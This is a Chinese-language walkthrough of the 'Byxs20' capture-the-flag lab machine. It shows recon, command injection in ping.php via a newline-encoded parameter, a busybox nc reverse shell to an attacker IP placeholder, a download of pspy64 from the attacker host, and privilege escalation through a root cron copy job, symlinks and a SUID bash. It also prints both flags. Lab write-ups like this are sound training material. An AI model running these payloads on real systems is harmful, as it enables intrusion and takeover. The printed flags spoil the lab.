*   **靶机名称:** Byxs20 (内部测试 - 可能发布于 HackMyVm)
*   **难度:** 简单 (Easy)
*   **目标:** 获取 user.txt 和 root.txt 文件中的 flag。
*   **关键点:** Web 命令注入、Cron 任务利用、Sudo 提权

---

## 1. 信息收集 (Enumeration)

初始阶段的目标是尽可能多地了解目标系统。

* **网络发现 (arp-scan):**
  使用 `arp-scan` 扫描本地网络，发现目标靶机的 IP 地址。

  ```bash
  sudo arp-scan -l
  ```

  锁定目标 IP 为 `192.168.205.194`。

* **端口扫描 (nmap):**
  对目标 IP 进行全端口 TCP 扫描，识别开放的服务。

  ```bash
  nmap -p- 192.168.205.194
  ```

  发现开放了两个关键端口：

  *   `22/tcp`: SSH 服务
  *   `80/tcp`: HTTP 服务 (Web 服务器)

* **Web 内容发现 (gobuster):**
  针对 80 端口的 Web 服务进行目录和文件枚举。

  ```bash
  gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak
  ```

  发现以下值得关注的路径和文件：

  *   `/index.html`: 网站首页。
  *   `/templates/`: 存在目录列表，包含 `about.html`, `contact.html`, `home.html` 等模板文件。
  *   `/template.php`: 一个 PHP 脚本，似乎用于加载模板。
  *   `/conf/`: 同样存在目录列表，可能存放配置文件。
  *   `/ping.php`: 另一个 PHP 脚本，名字暗示其功能与网络 ping 相关。

## 2. 获取初步立足点 (www-data 权限)

* **分析 Web 功能:**

  *   尝试访问 `/template.php`，发现可以通过 `?page=` 参数加载 `/templates/` 目录下的文件（如 `?page=about` 会包含 `about.php`）。这暗示存在 LFI (本地文件包含) 漏洞。
  *   进一步测试 LFI，尝试读取 `/etc/passwd` (`?page=../../../../etc/passwd`) 失败。错误信息显示脚本在路径末尾强制添加了 `.php` 后缀。
  *   **重要发现:** 尝试包含脚本自身 (`?page=../template`) 也失败了，并返回 `No such file or directory`。这强烈暗示 PHP 配置了 `open_basedir`，限制了文件包含的范围，使得这个 LFI 漏洞难以直接利用来读取敏感文件。

* **探索 `ping.php`:**

  *   直接访问 `ping.php` 返回 "Invalid IP!"。
  *   使用 `ip` 参数 (`ping.php?ip=127.0.0.1`) 可以成功执行 ping 命令。

* **发现隐藏参数 (wfuzz):**
  使用 `wfuzz` 对 `ping.php` 进行参数 Fuzzing，寻找除 `ip` 之外的其他参数。

  ```bash
  wfuzz -u "http://192.168.205.194/ping.php?FUZZ=127.0.0.1" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2
  ```

  发现了一个名为 `debug` 的参数。

* **命令注入 (Command Injection):**
  **核心发现：** 单独使用 `ip` 参数只能执行 ping，单独使用 `debug` 参数（如果有效）也无法直接 RCE。**必须将 `ip` 和 `debug` 参数结合起来**，才能触发命令注入漏洞。
  测试命令注入：使用 `%0A` (URL 编码的换行符) 在 `ip` 参数中附加 `id` 命令，并同时加上 `debug=1` 参数。

  ```bash
  curl "http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&debug=1"
  ```

  返回的输出包含了 `[*] Debug Mode Activated`、`[+] Raw Command: ping -c 3 127.0.0.1\nid` 以及 `id` 命令的执行结果 (`uid=33(www-data)...`)，确认了命令注入！

* **获取反弹 Shell (Reverse Shell):**
  利用这个命令注入点获取反向 Shell。

  1. 在攻击机上设置 Netcat 监听：

     ```bash
     nc -lvnp 8888
     ```

  2. 构造并发送反弹 Shell 的 payload。使用 `busybox nc` 提高兼容性，并对 payload 进行 URL 编码。

     ```bash
     # Payload: busybox nc [你的攻击机IP] 8888 -e /bin/bash
     # URL 编码后: busybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash
     curl "http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash&debug=1"
     ```

     将 `[你的攻击机IP]` 替换为你的 IP。执行后，`nc` 监听端应收到连接。

* **升级 Shell:**
  为了更好的交互体验，将获取到的基础 Shell 升级为标准的 TTY。

  ```bash
  # 在反弹 Shell 中
  script /dev/null -c bash
  # 按 Ctrl+Z
  # 在攻击机终端
  stty raw -echo; fg
  # 按两次 Enter
  # 回到反弹 Shell
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 40 columns 178 # 根据实际终端调整
  ```

  现在你拥有了一个稳定的 `www-data` 权限 Shell。

## 3. 权限提升 (Privilege Escalation)

* **进程监控与 Cron 任务发现 (pspy):**
  上传并运行 `pspy64` 工具来监控系统进程，寻找提权机会。

  1. 在攻击机上开启 HTTP 服务以提供 `pspy64`。

  2. 在目标机 `/tmp` 目录下下载并运行 `pspy64`。

     ```bash
     # 在目标机 www-data Shell 中
     cd /tmp
     busybox wget http://[你的攻击机IP]/pspy64
     chmod +x pspy64
     ./pspy64
     ```

     `pspy64` 的输出揭示了一个以 root 权限 (`UID=0`) 定期执行的 Cron 任务：

  ```
  2025/04/20 09:42:01 CMD: UID=0 PID=658 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf
  ```

  这个任务每分钟会将 `/var/www/html/conf/apache2.conf.bak` 覆盖到 `/etc/apache2/apache2.conf`。由于 `www-data` 用户通常对 `/var/www/html/conf` 目录有写权限，这成为了提权的关键。

* **提权方法 1: Cron + 符号链接任意文件读取**
  利用 Cron 任务覆盖文件的行为，通过创建符号链接来读取任意文件。

  1. **读取 user flag:** 将 `apache2.conf.bak` 链接到 `user.txt`。

     ```bash
     cd /var/www/html/conf
     ln -sf /home/welcome/user.txt apache2.conf.bak
     ```

  2. 等待 Cron 任务执行（最多 1 分钟）。

  3. 读取被覆盖后的 Apache 配置文件，即得到 `user.txt` 的内容。

     ```bash
     cat /etc/apache2/apache2.conf
     # -> flag{user-05659dca555d4ddbc396b319645f3d2a}
     ```

  4. **读取 root flag:** 删除旧链接，创建新链接指向 `root.txt`。

     ```bash
     rm apache2.conf.bak
     touch apache2.conf.bak
     ln -sf /root/root.txt apache2.conf.bak
     ```

  5. 再次等待 Cron 任务执行。

  6. 读取 Apache 配置文件得到 `root.txt` 的内容。

     ```bash
     cat /etc/apache2/apache2.conf
     # -> flag{root-f9ef88715e3bbec612f9f88d64ae3a99}
     ```

* **提权方法 2: Cron 修改配置 + 用户切换 + Sudo 提权**
  这是一个更曲折但同样有效的方法。

  1. **修改 Apache 配置:** 利用 Cron 任务，修改 Apache 的运行用户为 `welcome`。

     ```bash
     cd /var/www/html/conf
     nano apache2.conf.bak
     User welcome
     Group welcome
     ```

  2. 等待 Cron 执行，并让 Apache 服务以新用户身份运行（可以直接`sudo /usr/sbin/reboot`）。

  3. **获取 `welcome` Shell:** 再次使用之前的命令注入获取反弹 Shell。连接后确认用户身份。

     ```bash
     # ... 获取反弹 Shell ...
     id
     # 应显示 uid=1000(welcome) ...
     ```

  4. **检查 Sudo 权限:** 作为 `welcome` 用户，查看其 `sudo` 权限。

     ```bash
     sudo -l
     ```

     发现 `welcome` 可以无密码执行 `/home/welcome/test/test`。

  5. **利用 Sudo 规则:** 由于 `welcome` 可以控制 `test/test` 脚本的内容，可以构造恶意脚本。

  6. 创建脚本，赋予 `/bin/bash` SUID 权限。

     ```bash
     mv /home/welcome/test /home/welcome/test1
     mkdir /home/welcome/test
     echo '#!/bin/bash' > /home/welcome/test/test
     echo 'chmod u+s /bin/bash' >> /home/welcome/test/test
     chmod +x /home/welcome/test/test
     ```

  7. 通过 `sudo` 执行该脚本。

     ```bash
     sudo /home/welcome/test/test
     ```

  8. **获取 Root:** 执行带有 SUID 权限的 `bash`。

     ```bash
     bash -p
     id
     # 应显示 euid=0(root)
     ```

     成功获取 root 权限。

## 4. 获取 Flag

*   **User Flag:** `flag{user-05659dca555d4ddbc396b319645f3d2a}` (位于 `/home/welcome/user.txt`)
*   **Root Flag:** `flag{root-f9ef88715e3bbec612f9f88d64ae3a99}` (位于 `/root/root.txt`)